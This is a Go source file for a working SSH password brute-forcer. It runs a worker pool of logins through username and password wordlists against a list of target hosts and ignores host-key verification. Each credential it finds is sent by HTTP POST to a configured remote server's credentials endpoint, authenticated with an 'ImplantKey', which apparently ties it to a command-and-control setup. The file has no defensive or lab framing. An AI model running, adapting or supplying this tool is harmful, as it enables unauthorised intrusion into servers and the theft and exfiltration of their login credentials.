package bruteforcer

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
)

type Config struct {
	Targets    []string
	Port       int
	Workers    int
	Usernames  []string
	Passwords  []string
	Timeout    time.Duration
	ServerURL  string
	ImplantKey string
}

type Result struct {
	Target   string `json:"target"`
	Port     int    `json:"port"`
	Username string `json:"username"`
	Password string `json:"password"`
	Success  bool   `json:"success"`
}

type job struct {
	target   string
	username string
	password string
}

type Bruteforcer struct {
	config   Config
	Results  chan Result
	attempts atomic.Int64
	found    atomic.Int64
	client   *http.Client
}

func New(cfg Config) *Bruteforcer {
	if cfg.Port == 0 {
		cfg.Port = 22
	}
	if cfg.Workers == 0 {
		cfg.Workers = 10
	}
	if cfg.Timeout == 0 {
		cfg.Timeout = 5 * time.Second
	}
	return &Bruteforcer{
		config:  cfg,
		Results: make(chan Result, 100),
		client:  &http.Client{Timeout: 10 * time.Second},
	}
}

func (b *Bruteforcer) Run(ctx context.Context) error {
	total := len(b.config.Targets) * len(b.config.Usernames) * len(b.config.Passwords)
	log.Printf("[*] Starting brute force: %d targets × %d users × %d passwords = %d attempts",
		len(b.config.Targets), len(b.config.Usernames), len(b.config.Passwords), total)
	log.Printf("[*] Workers: %d | Timeout: %s | Port: %d", b.config.Workers, b.config.Timeout, b.config.Port)

	jobs := make(chan job, b.config.Workers*2)
	var wg sync.WaitGroup

	for i := 0; i < b.config.Workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			b.worker(ctx, jobs)
		}()
	}

	go func() {
		defer close(b.Results)
		wg.Wait()
	}()

	go b.printProgress(ctx, total)

	go func() {
		defer close(jobs)
		for _, target := range b.config.Targets {
			for _, user := range b.config.Usernames {
				for _, pass := range b.config.Passwords {
					select {
					case <-ctx.Done():
						return
					case jobs <- job{target: target, username: user, password: pass}:
					}
				}
			}
		}
	}()

	var found []Result
	for r := range b.Results {
		if r.Success {
			found = append(found, r)
			log.Printf("[+] FOUND: %s@%s:%d (password: %s)", r.Username, r.Target, r.Port, r.Password)
			if b.config.ServerURL != "" {
				b.reportCredential(r)
			}
		}
	}

	log.Printf("[*] Complete: %d attempts, %d credentials found", b.attempts.Load(), len(found))
	return nil
}

func (b *Bruteforcer) worker(ctx context.Context, jobs <-chan job) {
	for {
		select {
		case <-ctx.Done():
			return
		case j, ok := <-jobs:
			if !ok {
				return
			}
			b.attempts.Add(1)
			success := b.trySSH(j.target, b.config.Port, j.username, j.password)
			if success {
				b.found.Add(1)
				b.Results <- Result{
					Target:   j.target,
					Port:     b.config.Port,
					Username: j.username,
					Password: j.password,
					Success:  true,
				}
			}
		}
	}
}

func (b *Bruteforcer) trySSH(target string, port int, username, password string) bool {
	config := &ssh.ClientConfig{
		User:            username,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         b.config.Timeout,
	}

	addr := net.JoinHostPort(target, fmt.Sprintf("%d", port))
	conn, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func (b *Bruteforcer) reportCredential(r Result) {
	body := map[string]interface{}{
		"username": r.Username,
		"password": r.Password,
		"target":   r.Target,
		"port":     r.Port,
		"service":  "ssh",
		"valid":    true,
	}
	data, _ := json.Marshal(body)

	req, err := http.NewRequest("POST", b.config.ServerURL+"/api/v1/credentials", bytes.NewBuffer(data))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+b.config.ImplantKey)

	resp, err := b.client.Do(req)
	if err != nil {
		log.Printf("[-] Failed to report credential: %v", err)
		return
	}
	resp.Body.Close()
}

func (b *Bruteforcer) printProgress(ctx context.Context, total int) {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			attempts := b.attempts.Load()
			pct := float64(attempts) / float64(total) * 100
			log.Printf("[*] Progress: %d/%d (%.1f%%) | Found: %d", attempts, total, pct, b.found.Load())
		}
	}
}

func LoadWordlist(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, fmt.Errorf("open wordlist %s: %w", path, err)
	}
	defer f.Close()

	var lines []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("read wordlist: %w", err)
	}
	if len(lines) == 0 {
		return nil, fmt.Errorf("wordlist %s is empty", path)
	}
	return lines, nil
}
